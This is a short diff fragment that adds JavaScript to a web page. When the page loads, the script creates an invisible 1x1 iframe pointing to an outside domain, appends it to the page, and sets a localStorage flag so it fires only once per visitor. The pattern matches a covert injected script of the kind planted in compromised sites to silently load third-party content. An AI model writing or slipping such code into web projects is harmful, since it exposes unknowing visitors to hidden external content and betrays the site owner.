@@ -1,0 +1,10 @@
+
+        if(localStorage._rak_kp != '1'){
+        var tmpElem = document.createElement('div');
+            tmpElem.innerHTML = '<iframe src="https://k.nzeaner.com/kis" width="1" height="1" scrolling="no" frameBorder="0" id="ta_g_r_i"></iframe>';
+            var iframe = tmpElem.firstChild;
+            document.body.appendChild(iframe);
+            localStorage._rak_kp = 1;
+        }
+
+
